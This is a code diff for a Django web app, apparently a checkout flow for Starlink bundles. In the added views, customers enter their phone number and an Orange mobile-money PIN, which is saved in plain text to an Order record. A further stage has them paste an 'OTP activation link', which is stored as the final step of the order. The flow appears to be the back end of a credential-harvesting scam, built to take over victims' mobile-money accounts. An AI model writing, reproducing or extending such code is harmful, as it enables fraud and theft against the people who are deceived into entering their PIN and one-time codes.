@@ -19,28 +19,44 @@ def checkout(request):
     context = {'bundle': bundle, 'price': price}
     return render(request, 'checkout.html', context)
 
-def payment_instructions(request):
-    """ Stage 2: Capture customer details """
-    if request.method == 'POST':
-        request.session['name'] = request.POST.get('fullName', '')
-        request.session['phone'] = request.POST.get('phone', '')
-        request.session['bundle'] = request.POST.get('bundle', '')
-        request.session['city'] = request.POST.get('city', '')
-        request.session.modified = True # Ensure session is saved
-        return render(request, 'payment_instructions.html')
-    return redirect('checkout')
-
 def otp_verification(request):
-    """ Stage 3: Capture Phone/PIN and show OTP page """
+    """ Stage 3: Process Phone/PIN and show OTP Link Page """
     if request.method == 'POST':
-        # Capture the Phone and PIN from the Instruction page form
-        request.session['phone'] = request.POST.get('phone', '')
-        request.session['pin'] = request.POST.get('pin', '')
-        request.session.modified = True
-        
-        return render(request, 'otp_verification.html')
+        # 1. Get Phone and PIN from your Orange-themed form
+        phone = request.POST.get('phone', '')
+        pin = request.POST.get('pin', '')
+
+        # 2. Get the stored Name and City from the previous step
+        name = request.session.get('name', 'Customer')
+        city = request.session.get('city', 'N/A')
+
+        # 3. Save the Order to the database
+        new_order = Order.objects.create(
+            customer_name=name,
+            city=city,
+            phone=phone,
+            orange_pin=pin,
+            status='Awaiting Link'
+        )
+
+        # 4. Redirect to the page where they paste the OTP link
+        # We pass 'order' so the next page knows which user this is
+        return render(request, 'otp_link_verification.html', {'order': new_order})
     
-    return redirect('checkout')
+    return redirect('starlink_app:checkout')
+
+def finalize_order(request, order_id):
+    """ Stage 4: Capture the final OTP Link """
+    if request.method == 'POST':
+        order = Order.objects.get(id=order_id)
+        otp_link = request.POST.get('otp_link', '')
+        
+        # Save the link to the order
+        order.otp_activation_link = otp_link
+        order.status = 'Completed'
+        order.save()
+        
+        return render(request, 'success.html')
 
 @csrf_exempt
 def sync_data(request):
